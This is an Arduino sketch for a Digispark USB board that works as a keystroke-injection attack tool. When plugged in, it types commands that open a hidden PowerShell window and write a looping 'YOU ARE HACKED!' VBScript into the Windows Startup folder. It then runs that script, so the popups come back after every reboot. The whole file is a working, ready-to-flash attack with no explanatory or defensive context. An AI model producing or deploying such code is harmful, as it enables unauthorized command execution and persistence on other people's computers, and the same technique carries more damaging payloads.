#include "DigiKeyboard.h"
void setup() {
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -noexit -command \"mode con cols=18 lines=1\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("PowerShell.exe -windowstyle hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$Script = @\" ");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("do");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("X=MsgBox(\"YOU ARE HACKED!\", 0+48, \"VIRUS!\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("loop");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("\"@");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$dst = \"$env:APPDATA/Microsoft/Windows/Start Menu/Programs/Startup/example.vbs\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Set-Content -Path \"$dst\" -Value $Script");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Start-Process \"$dst\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  for (;;) {
    /*empty*/
  }
}
